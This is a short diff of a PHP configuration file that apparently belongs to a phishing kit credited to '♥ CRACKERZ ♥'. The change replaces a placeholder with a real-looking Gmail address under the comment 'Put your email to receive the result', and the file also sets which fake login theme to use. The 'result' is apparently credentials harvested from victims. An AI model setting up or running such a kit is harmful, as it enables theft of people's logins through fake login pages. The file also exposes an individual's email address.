@@ -6,7 +6,7 @@
 	$sp_name = "♥ CRACKERZ ♥";
 
 	//Put your email to receive the result.
-	$send_email = "youremail@gmail.com";
+	$send_email = "jochuarherrera@gmail.com";
 
 	//For use the old login put 'old', for the new login put 'new'.
 	$login_theme = "new";
